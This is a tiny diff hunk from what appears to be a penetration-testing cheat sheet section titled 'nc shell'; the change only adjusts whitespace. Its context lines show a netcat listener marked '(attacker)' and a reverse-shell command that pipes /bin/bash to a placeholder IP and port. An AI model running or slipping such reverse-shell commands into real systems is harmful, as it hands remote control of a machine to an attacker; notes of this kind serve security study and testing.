@@ -40,6 +40,7 @@ nc shell
 
 ----------
 
-nc -nvlp 9999 (attacker) 
+nc -nvlp 9999 (attacker)
+
 nc -nv -e /bin/bash IP PORT
 
